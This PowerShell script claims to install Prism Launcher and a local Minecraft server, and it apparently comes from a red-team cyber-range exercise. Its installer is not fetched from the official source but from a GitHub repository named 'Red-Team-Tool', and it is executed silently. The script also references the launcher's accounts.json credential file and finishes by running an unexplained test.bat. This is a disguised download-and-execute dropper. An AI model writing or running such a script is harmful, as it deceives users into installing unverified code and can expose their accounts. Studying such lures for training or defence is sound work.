# PowerShell Script to Install Prism Launcher and Set Up a Local Minecraft Server
# https://prismlauncher.org/

# Set variables
$PrismInstaller = "PrismLauncher-Windows-MSVC-Setup-9.2.exe"
$PrismURL = "https://github.com/imgavinhi/Red-Team-Tool/raw/main/PrismLauncher-Windows-MSVC-Setup-9.2.exe"  # Raw GitHub URL for the file
$ServerDir = "$env:USERPROFILE\MinecraftServer"
$ServerJar = "$ServerDir\server.jar"
$EULAFile = "$ServerDir\eula.txt"
$PrismAppDataDir = "$env:APPDATA\PrismLauncher"
$PrismInstallDir = "C:\Users\cyberrange\AppData\Local\Programs\PrismLauncher"  # Correct installation directory

# Function to check if Java is installed
function Check-Java {
    try {
        $javaVersion = java -version 2>&1
        if ($javaVersion -match "version") {
            Write-Output "Java is already installed."
            return $true
        }
    } catch {
        Write-Output "Java is not installed."
    }
    return $false
}

# Install Java if not installed
if (-not (Check-Java)) {
    Write-Output "Installing Java..."
    winget install EclipseAdoptium.Temurin.17.JDK -e
}

# Download and install Prism Launcher
Write-Output "Downloading Prism Launcher..."
Invoke-WebRequest -Uri $PrismURL -OutFile $PrismInstaller
Write-Output "Installing Prism Launcher..."
Start-Process -FilePath $PrismInstaller -ArgumentList "/S" -Wait
Remove-Item $PrismInstaller -Force

# Create Minecraft Server Directory
if (!(Test-Path $ServerDir)) {
    New-Item -ItemType Directory -Path $ServerDir
}

# Get the latest Minecraft server JAR URL
Write-Output "Fetching latest Minecraft server JAR..."
$ManifestURL = "https://launchermeta.mojang.com/mc/game/version_manifest.json"
$Manifest = Invoke-RestMethod -Uri $ManifestURL
$LatestVersion = $Manifest.latest.release
$VersionInfo = $Manifest.versions | Where-Object { $_.id -eq $LatestVersion }
$ServerDownloadURL = (Invoke-RestMethod -Uri $VersionInfo.url).downloads.server.url

# Download the latest Minecraft Server
Write-Output "Downloading Minecraft Server..."
Invoke-WebRequest -Uri $ServerDownloadURL -OutFile $ServerJar

# Create PrismLauncher folder in AppData if it doesn't exist
if (-not (Test-Path $PrismAppDataDir)) {
    Write-Output "Creating PrismLauncher folder in AppData..."
    New-Item -ItemType Directory -Path $PrismAppDataDir
}

# Define the path to the accounts.json file in PrismLauncher folder
$accountsFilePath = "$env:APPDATA\PrismLauncher\accounts.json"

# Start Prism Launcher and wait for it to initialize
Write-Output "Launching Prism Launcher..."
$prismProcess = Start-Process -FilePath "$PrismInstallDir\PrismLauncher.exe" -PassThru

# Wait for a brief moment to allow Prism to start
Start-Sleep -Seconds 10  # You can adjust the sleep time based on how long Prism takes to load

cmd.exe /c ".\test.bat"
